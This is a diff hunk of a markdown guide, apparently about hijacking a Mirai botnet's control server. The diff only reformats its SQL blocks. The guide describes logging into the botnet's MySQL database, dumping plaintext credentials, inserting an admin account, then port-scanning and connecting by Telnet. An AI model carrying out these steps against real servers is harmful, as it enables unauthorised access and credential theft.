@@ -9,20 +9,16 @@ This means you know the IP of a mirai botnet, you can now try to log in to mysql
 these commands:
 
 ```sql
-SHOW
-DATABASES;
-USE
-BOTNETDB; --It should be pretty obvious which is the botnet database
+SHOW DATABASES;
+USE BOTNETDB; --It should be pretty obvious which is the botnet database
 ```
 
 From there you can list all username and passwords which are stored in _plaintext_, or inject your own login with admin
 permissions:
 
 ```sql
-SELECT *
-FROM users;
-INSERT INTO users
-VALUES (NULL, 'username', 'password', 0, 0, 0, 0, -1, 1, 30, '');
+SELECT * FROM users;
+INSERT INTO users VALUES (NULL, 'username', 'password', 0, 0, 0, 0, -1, 1, 30, '');
 ```
 
 Once you have done this, do a simple TCP portscan to find the mirai port, connect with Telnet, and login with your
